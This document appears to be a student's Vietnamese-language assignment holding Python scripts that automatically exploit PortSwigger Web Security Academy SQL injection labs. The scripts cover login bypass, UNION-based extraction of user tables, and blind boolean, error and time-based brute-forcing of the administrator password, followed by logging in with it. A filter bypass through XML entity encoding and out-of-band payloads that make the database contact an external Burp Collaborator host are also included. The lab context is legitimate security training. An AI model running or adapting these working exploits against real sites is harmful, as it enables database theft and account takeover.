# Task 3

TASK 3
- Viết code python tự động khai thác cho 18 lab cũ
- Làm thêm 3 lab:
https://battle.cookiearena.org/challenges/web/baby-sql-injection-to-rcehttps://battle.cookiearena.org/challenges/web/simple-blind-sql-injectionhttps://battle.cookiearena.org/challenges/web/blind-logger-middleware
- Tìm và làm ít nhất 2 bài SQL Injection trên trang:
https://www.root-me.org/
- Viết wu đầy đủ
DEADLINE: 24h 6/6/2025https://battle.cookiearena.org/challenges/web/baby-sql-injection-to-rce

# Code python cho 18 lab SQLi cho 18 Lab trên portswigger

1. Lab 1

```python
import requests

url= "https://0abc007e038d7bba808b173000450053.web-security-academy.net/"
target_url= f"{url}/filter?category=Gifts'+or+1=1--"
response= requests.get(target_url)
if (response.status_code == 200):
    print("Successful")
    print(response.text)  # Hiển thị nội dung HTML trả về
else:
    print("Failed")
```

1. **Lab: SQL injection vulnerability allowing login bypass**

```python
import requests
from bs4 import BeautifulSoup

url = "https://0a9000bd03853776800772ed003400dc.web-security-academy.net/"
target_url= f"{url}/login"

# trích xuất token CSRF từ trang login
session= requests.Session()
response = session.get(target_url)
soup= BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']

# payload để gửi yêu cầu đăng nhập với token CSRF
payload = {
    "username": "administrator'--",
    "password": "password",
    "csrf": csrf_token
}

# gửi yêu cầu đăng nhập với token CSRF
response = session.post(target_url, data=payload)
if(response.status_code == 200):
    print("Successful")
else:
    print("Failed")
```

1. **Lab: SQL injection attack, querying the database type and version on Oracle**

```python
import requests

url= "https://0a7d008a04a4c92180f60831000700f5.web-security-academy.net/filter?category=Gifts"

i=1
while True:
    order_url= f"{url}'+order+by+{i}--"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
        
null_url= ",".join(["NULL"]*(i-1))
union_url= f"{url}'+union+select+banner,{null_url}+from+v$version--"

print(f"Payload: {union_url}")
response= requests.get(union_url)
if response.status_code == 200:
    print("Successful")
else:
    print("Failed")
```

1. **Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**

```python
import requests

url= "https://0a83002c048e25ad807cc16300910000.web-security-academy.net/filter?category=Tech+gifts"

i=1
while True:
    order_url= f"{url}'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
        
null_url= ",".join(["NULL"]*(i-1))
union_url= f"{url}'+union+select+@@version,{null_url}-- -"

print(f"Payload: {union_url}")
response= requests.get(union_url)
if response.status_code == 200:
    print("Successful")
else:
    print("Failed")
```

1. **Lab: SQL injection attack, listing the database contents on non-Oracle databases**

```python
import requests
from bs4 import BeautifulSoup
url= "https://0a05001a0383b07780c3170b003e0001.web-security-academy.net/"

#Step 1:Finding the number of columns in the response
i=1
while True:
    order_url= f"{url}/filter?category=Tech+gifts'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
print(f"có {i} cột")

#Step 2: Find column that have string type
num_col=i
found_column = None
for j in range(1, num_col + 1):
    null_url= ",".join(["NULL"]*(num_col-1))
    if j==1:  # test cột 1
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+'a',{null_url}-- -"
    elif j== num_col:  # test cột cuối
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_url},'a'-- -"
    else:  # test cột giữa
        null_left= ",".join(["NULL"]*(j-1))
        null_right= ",".join(["NULL"]*(num_col-j))
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_left},'a',{null_right}-- -"
    response= requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Column {j} is string type")
        break

#Step 3: Check the tables
payload_columns = ["NULL"] * num_col
payload_columns[found_column - 1] = "table_name"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{','.join(payload_columns)}+from+information_schema.tables-- -"
print("Payload:", union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("users_"):   #strip() : loại bỏ khoảng trắng, startswith: bắt đầu bằng
            random = th.text.strip().split("_",1)[1] #split: cắt chuỗi thành danh sách
            print("Table name: users_", random)
            break

#Step 4: Check the columns
payload_columns[found_column - 1] = "column_name"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{',+'.join(payload_columns)}+from+information_schema.columns+where+table_name='users_{random}'-- -"
response= requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    random1, random2 = None, None
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            if th.text.strip().startswith("username_") and random1 is None: random1= th.text.strip().split("_",1)[1]
            elif th.text.strip().startswith("password_") and random2 is None: random2= th.text.strip().split("_",1)[1]
        if random1 and random2:
            print(f"Column names: username_{random1}, password_{random2}")
            break
# Step 5: Get the data
payload_columns[found_column - 1] = f"username_{random1}||'~'||password_{random2}"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{','.join(payload_columns)}+from+users_{random}-- -"
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            if th.text.strip().startswith("administrator"):
                password = th.text.strip().split("~", 1)[1]
                print(f"Administrator password: {password}")
                break
# Step 6: Login with the found password
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
if response.status_code == 200:
    print("Login successful!")
else:
    print("Login failed!")
```

1. **Lab: SQL injection attack, listing the database contents on Oracle**

```python
import requests
from bs4 import BeautifulSoup
url= "https://0acc001f0418e4ec8248249000b10014.web-security-academy.net"

#Step 1:Finding the number of columns in the response
i=1
while True:
    order_url= f"{url}/filter?category=Tech+gifts'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
print(f"có {i} cột")

#Step 2: Find column that have string type
num_col=i
found_column = None
for j in range(1, num_col + 1):
    null_url= ",".join(["NULL"]*(num_col-1))
    if j==1:  # test cột 1
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+'a',{null_url}+from+dual-- -"
    elif j== num_col:  # test cột cuối
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_url},'a'+from+dual-- -"
    else:  # test cột giữa
        null_left= ",".join(["NULL"]*(j-1))
        null_right= ",".join(["NULL"]*(num_col-j))
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_left},'a',{null_right}+from+dual-- -"
    response= requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Column {j} is string type")
        break

#Step 3: Check the tables
payload_columns = ["NULL"] * num_col
payload_columns[found_column - 1] = "table_name"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{','.join(payload_columns)}+from+all_tables-- -"
print("Payload:", union_url)
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th and th.text.strip().startswith("USERS_"):   #strip() : loại bỏ khoảng trắng, startswith: bắt đầu bằng
            random = th.text.strip().split("_",1)[1] #split: cắt chuỗi thành danh sách
            print("Table name: USERS_", random)
            break

#Step 4: Check the columns
payload_columns[found_column - 1] = "column_name"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{',+'.join(payload_columns)}+from+all_tab_columns+where+table_name='USERS_{random}'-- -"
response= requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    random1, random2 = None, None
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            if th.text.strip().startswith("USERNAME_") and random1 is None: random1= th.text.strip().split("_",1)[1]
            elif th.text.strip().startswith("PASSWORD_") and random2 is None: random2= th.text.strip().split("_",1)[1]
        if random1 and random2:
            print(f"Column names: USERNAME_{random1}, PASSWORD_{random2}")
            break
# Step 5: Get the data
payload_columns[found_column - 1] = f"USERNAME_{random1}||'~'||PASSWORD_{random2}"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{','.join(payload_columns)}+from+USERS_{random}-- -"
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            if th.text.strip().startswith("administrator"):
                password = th.text.strip().split("~", 1)[1]
                print(f"Administrator password: {password}")
                break
# Step 6: Login with the found password
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
if response.status_code == 200:
    print("Login successful!")
else:
    print("Login failed!")
```

1. **Lab: SQL injection UNION attack, determining the number of columns returned by the query**

```python
import requests
from bs4 import BeautifulSoup
url= "https://0acb0023030226068097940d004c0013.web-security-academy.net"

#Step 1:Finding the number of columns in the response
i=1
while True:
    order_url= f"{url}/filter?category=Tech+gifts'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
print(f"có {i} cột")

null_value= ",".join(["NULL"]*(i))
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{null_value}-- -"
response = requests.get(union_url)
if response.status_code == 200:
    print("Successfull")

```

1. **Lab: SQL injection UNION attack, finding a column containing text**

```python
import requests
from bs4 import BeautifulSoup
url= "https://0aea00d504a05b6282c22ab1006e00cc.web-security-academy.net/"

#Step 1:Finding the number of columns in the response
i=1
while True:
    order_url= f"{url}/filter?category=Tech+gifts'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
print(f"có {i} cột")

#Step 2: Find column that have string type
test_string="'5YqtZH'"
num_col=i
found_column = None
for j in range(1, num_col + 1):
    null_url= ",".join(["NULL"]*(num_col-1))
    if j==1:  # test cột 1
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{test_string},{null_url}-- -"
    elif j== num_col:  # test cột cuối
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_url},{test_string}-- -"
    else:  # test cột giữa
        null_left= ",".join(["NULL"]*(j-1))
        null_right= ",".join(["NULL"]*(num_col-j))
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_left},{test_string},{null_right}-- -"
    response= requests.get(union_url)
    if response.status_code == 200:
        print("Successfull")
        break
```

1. **Lab: SQL injection UNION attack, retrieving data from other tables**

```python
import requests
from bs4 import BeautifulSoup
url= "https://0afb00fa032561f48125891a002f00e6.web-security-academy.net/"

#Step 1:Finding the number of columns in the response
i=1
while True:
    order_url= f"{url}/filter?category=Tech+gifts'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
print(f"có {i} cột")

#Step 2: Find column that have string type
num_col=i
found_column = None
for j in range(1, num_col + 1):
    null_url= ",".join(["NULL"]*(num_col-1))
    if j==1:  # test cột 1
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+'a',{null_url}-- -"
    elif j== num_col:  # test cột cuối
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_url},'a'-- -"
    else:  # test cột giữa
        null_left= ",".join(["NULL"]*(j-1))
        null_right= ",".join(["NULL"]*(num_col-j))
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_left},'a',{null_right}-- -"
    response= requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Column {j} is string type")
        break
# Step 5: Get the data
payload_columns= ["NULL"]*num_col
payload_columns[found_column - 1] = f"username||'~'||password"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{','.join(payload_columns)}+from+users-- -"
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            if th.text.strip().startswith("administrator"):
                password = th.text.strip().split("~", 1)[1]
                print(f"Administrator password: {password}")
                break
# Step 6: Login with the found password
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
else:
    print("Đăng nhập thành công!")
```

1. **Lab: SQL injection UNION attack, retrieving multiple values in a single column**

```python
import requests
from bs4 import BeautifulSoup
url= "https://0a9200ce042e8a8f80641c2200b90071.web-security-academy.net/"

#Step 1:Finding the number of columns in the response
i=1
while True:
    order_url= f"{url}/filter?category=Tech+gifts'+order+by+{i}-- -"
    response= requests.get(order_url)
    if response.status_code == 200:
        i += 1
    else: 
        i-= 1
        break
print(f"có {i} cột")

#Step 2: Find column that have string type
num_col=i
found_column = None
for j in range(1, num_col + 1):
    null_url= ",".join(["NULL"]*(num_col-1))
    if j==1:  # test cột 1
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+'a',{null_url}-- -"
    elif j== num_col:  # test cột cuối
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_url},'a'-- -"
    else:  # test cột giữa
        null_left= ",".join(["NULL"]*(j-1))
        null_right= ",".join(["NULL"]*(num_col-j))
        union_url= f"{url}/filter?category=Tech+gifts'+union+select+{null_left},'a',{null_right}-- -"
    response= requests.get(union_url)
    if response.status_code == 200:
        found_column = j
        print(f"Column {j} is string type")
        break
# Step 5: Get the data
payload_columns= ["NULL"]*num_col
payload_columns[found_column - 1] = f"username||'~'||password"
union_url = f"{url}/filter?category=Tech+gifts'+union+select+{','.join(payload_columns)}+from+users-- -"
response = requests.get(union_url)
if response.status_code == 200:
    soup = BeautifulSoup(response.text, "html.parser")
    for row in soup.find_all("tr"):
        th = row.find("th")
        if th:
            if th.text.strip().startswith("administrator"):
                password = th.text.strip().split("~", 1)[1]
                print(f"Administrator password: {password}")
                break
# Step 6: Login with the found password
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
else:
    print("Đăng nhập thành công!")
```

1. **Lab: Blind SQL injection with conditional responses**

```python
import requests
from bs4 import BeautifulSoup

url = "https://0ab700eb032b311f83eae13d00f900a8.web-security-academy.net/"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"Tracking ID: {tracking_id}")

# Hàm kiểm tra điều kiện boolend
def check_payload(payload):
    cookies = {"TrackingId": f"{tracking_id}{payload}",
                "session": "abcd"}
    response = requests.get(url, cookies=cookies)
    return "Welcome" in response.text

# step 1: kiểm tra bảng user có tồn tại không
payload  = f"' and (select 'a' from users limit 1)='a"
if check_payload(payload):
    print("Bảng users tồn tại")
else:
    print("Bảng users không tồn tại")
    exit()

# step 2: kiểm tra user administrator có tồn tại không
payload = "' and (select 'a' from users where username='administrator' limit 1)='a"
if check_payload(payload):
    print("User administrator tồn tại") 
else:
    print("User administrator không tồn tại")

# step 3: kiểm tra độ dài password của user administrator
password_length = 0
for i in range(1, 31):
    payload = f"'and (select 'a' from users where username='administrator' and length(password)={i} limit 1)='a"
    if check_payload(payload):
        password_length = i
        break
print(f"Độ dài password của user administrator là: {password_length}")

# step 4: brute force từng ký tự của password
charset = "abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,"
password = ""
for i in range(1, password_length + 1):
    found= False
    for char in charset:
        payload = f"' and (select 'a' from users where username='administrator' and substring(password, {i}, 1)='{char}' limit 1)='a"
        if check_payload(payload):
            password += char
            found = True
            print(f"\nĐã tìm được: {password}")
            break
if not found:
    print(f"Không tìm thấy ký tự thứ {i}")
print(f"Password của user administrator là: {password}")

# step 5: login
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
else:
    print("Đăng nhập thành công!")
```

1. **Lab: Blind SQL injection with conditional errors**

```python
import requests
from bs4 import BeautifulSoup

url = "https://0a2600ae03c77c1b80911261000c0000.web-security-academy.net/"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"Tracking ID: {tracking_id}")

# Hàm kiểm tra điều kiện boolend
def check_payload(payload):
    cookies = {"TrackingId": f"{tracking_id}{payload}",
                "session": "abcd"}
    response = requests.get(url, cookies=cookies)
    return response.status_code == 200

# step 1: kiểm tra bảng user có tồn tại không
payload  = "'||(select '' from users where rownum =1 )||'"
if check_payload(payload):
    print("Bảng users tồn tại")
else:
    print("Bảng users không tồn tại")
    exit()

# step 2: kiểm tra user administrator có tồn tại không
payload = "'||(select case when (username='administrator') then to_char(1/0) else '' end from users where rownum =1 )||'"
if not check_payload(payload):
    print("User administrator tồn tại") 
else:
    print("User administrator không tồn tại")
    exit()

# step 3: kiểm tra độ dài password của user administrator
password_length = 0
for i in range(1, 31):
    payload = f"'||(select case when (username='administrator' and length(password)={i}) then to_char(1/0) else '' end from users where rownum =1 )||'"
    if not check_payload(payload):
        password_length = i
        break
print(f"Độ dài password của user administrator là: {password_length}")

# step 4: brute force từng ký tự của password
charset = "abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,"
password = ""
for i in range(1, password_length + 1):
    found= False
    for char in charset:
        payload = f"'||(select case when (username='administrator' and substr(password, {i}, 1)='{char}') then to_char(1/0) else '' end from users where rownum =1 )||'"
        if not check_payload(payload):
            password += char
            found = True
            print(f"\nĐã tìm được: {password}")
            break
if not found:
    print(f"Không tìm thấy ký tự thứ {i}")
    exit()
print(f"Password của user administrator là: {password}")

# step 5: login
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
else:
    print("Đăng nhập thành công!")
```

1. **Lab: Visible error-based SQL injection**

```python
import requests
import re
from bs4 import BeautifulSoup
url = "https://0a0900fb0432dc4e81c243b100b300a2.web-security-academy.net/"

# Step 1 : kiểm tra username= 'administrator' có tồn tại không
payload_check_admin = "' and 1=cast((select username='administrator' from users limit 1) as int)--" 
cookies = {
    "TrackingId": payload_check_admin,
    "session": "abcd"
}
response = requests.get(url, cookies=cookies)
# tìm 'administrator' trong response
match = re.search(r'administrator', response.text)
print(match)
if match:
    print("User 'administrator' tồn tại")
else:
    print("User 'administrator' không tồn tại")
    exit()

# step 2: tìm password của user 'administrator'
payload_check_pass = "' and 1=cast((select password from users limit 1) as int)--"
cookies["TrackingId"] = payload_check_pass
response = requests.get(url, cookies=cookies)
match = re.search(r'integer: "(.{20})"', response.text) # . là tất cả các ký tự trừ dấu xuống dòng, {20} là 20 ký tự
if match:
    password = match.group(1)  # lấy giá trị trong dấu ngoặc đơn
    print(f"Password của user 'administrator' là: {password}")
else:
    print("Không tìm thấy password của user 'administrator'")
    exit()

# step 3: đăng nhập 
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]
login_payload = {
    "csrf": csrf_token,
    "username": 'administrator',
    "password": password
}
response = session.post(f"{url}/login", data= login_payload)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
elif "Your username is: administrator" in response.text:
    print("Đăng nhập thành công!")
```

1. **Lab: Blind SQL injection with time delays**

```python
import requests

url= "https://0ab9008204260cc880c4b27800c70026.web-security-academy.net/"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"TrackingId: {tracking_id}")

payload = f"{tracking_id}'||pg_sleep(10)--"
cookies = {
    "TrackingId": payload,
    "session": "abcd"
}
response = requests.get(url, cookies=cookies)
if response.elapsed.total_seconds() > 10:
    print("SQL Injection thành công, server đã bị delay 10 giây")  
else:
    print("SQL Injection không thành công, server không bị delay")
```

1. **Lab: Blind SQL injection with time delays and information retrieval**

```python
import requests
import time
from bs4 import BeautifulSoup
url= "https://0a27003504b3533880b14429005f0091.web-security-academy.net/"
response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break
print(f"TrackingId: {tracking_id}")

# Hàm kiểm tra điều kiện đúng hay sai
def check_payload(payload):
    cookies = {
        "TrackingId": payload,
        #"session": "abcde"
    }
    start_time = time.time()
    response = requests.get(url, cookies=cookies)
    end_time = time.time()
    response_time = end_time - start_time
    return response_time > 5

# Bước 1: Kiểm tra bảng users có tồn tại không
payload = "'||(select case when(1=1) then pg_sleep(5) end from users)--"
if check_payload(payload):
    print("Bảng users tồn tại")
else:
    print("Bảng users không tồn tại")
    exit()

#Bước 2: Kiểm tra user 'administrator' có tồn tại không
payload = "'%3Bselect case when (username='administrator') then pg_sleep(5) end from users--"
if check_payload(payload):
    print("User 'administrator' tồn tại") 
else:
    print("User 'administrator' không tồn tại")
    exit()

# Bước 3: Tìm độ dài mật khẩu của user 'administrator'
password_length = 0
for length in range (1, 31):
    payload = f"'%3Bselect case when (username = 'administrator' and length(password) = {length}) then pg_sleep(5) end from users--"
    if check_payload(payload):
        password_length = length
        break
print(f"Độ dài mật khẩu của user 'administrator' là: {password_length}")

# Bước 4: Brute-force từng ký tự của mật khẩu
charset = 'abcdefghijklmnopqrstuvwxyz.0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()}{ ,'
password = ''
for i in range(1, password_length +1):
    found = False
    for char in charset:
        payload = f"'%3B select case when(username='administrator' and substring(password,{i},1)='{char}') then pg_sleep(5) end from users--"
        if check_payload(payload):
            password += char
            found = True
            print(f"Đã tìm được {password}")
            break
    if not found:
        break
print(f"Mật khẩu của user 'administrator' là: {password}")

# Bước 5: Đăng nhập
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf'})['value']
data = {
    "csrf": csrf_token,
    "username": "administrator",
    "password": password
}
response = session.post(f"{login_url}", data=data)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
elif "Your username is: administrator" in response.text:
    print("Đăng nhập thành công!")

```

1. **Lab: Blind SQL injection with out-of-band interaction**

```python
import requests
url = "https://0a8300fe04162180806912aa00ab00a6.web-security-academy.net"
collaborator_subdomain = "659kzpscysw5ufwh8mb9xfp33u9kx9.burpcollaborator.net" 

payload = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//{collaborator_subdomain}/\">+%25remote%3b]>'),'/l')+FROM+dual--"

cookies = {
    "TrackingId": payload,
    "session": "abc"
}
response = requests.get(url, cookies=cookies)
print("Payload sent successfully!")
print("Check Burp Collaborator client for DNS lookup interactions.")

```

1. **Lab: Blind SQL injection with out-of-band data exfiltration**

```python
import requests
url = "https://0a8300fe04162180806912aa00ab00a6.web-security-academy.net"
collaborator_subdomain = "659kzpscysw5ufwh8mb9xfp33u9kx9.burpcollaborator.net" 

payload = f"'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//{collaborator_subdomain}/\">+%25remote%3b]>'),'/l')+FROM+dual--"

cookies = {
    "TrackingId": payload,
    "session": "abc"
}
response = requests.get(url, cookies=cookies)
print("Payload sent successfully!")
print("Check Burp Collaborator client for DNS lookup interactions.")

```

1. **Lab: SQL injection with filter bypass via XML encoding**

```python
import requests
from bs4 import BeautifulSoup
import re
url = "https://0afd006303d2505082d94847000200f6.web-security-academy.net"

# hàm mã hóa hex
def hex_encode(s):
    return ''.join([f'&#x{ord(c):x};' for c in s])

sql_payload = "1 union select username || '~' || password from users"
encoded_payload = hex_encode(sql_payload)

# Tạo dữ liệu XML để POST
xml_data = f"""<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>{encoded_payload}</storeId>
</stockCheck>"""

# Gửi yêu cầu POST để lấy password
response = requests.post(f"{url}/product/stock", data=xml_data, headers={'Content-Type': 'application/xml'})
if response.status_code == 200:
    match = re.search(r'(administrator)~(.{20})', response.text)
    if match:
        username, password = match.groups()
        print(f"Username: {username}, Password: {password}")
    else:
        print("No match found")
        exit()

# đăng nhập
login_url = f"{url}/login"
session = requests.Session()
response = session.get(login_url)
if response.status_code != 200:
    print(f"Không thể truy cập {login_url}, mã lỗi: {response.status_code}")
    exit()
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find("input", {"name": "csrf"})["value"]
data = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}
response = session.post(login_url, data=data)
print(response.text)
if "Invalid username or password" in response.text:
    print("Đăng nhập không thành công, username hoặc password không đúng")
elif "Your username is" in response.text:
    print("Đăng nhập thành công!")

```
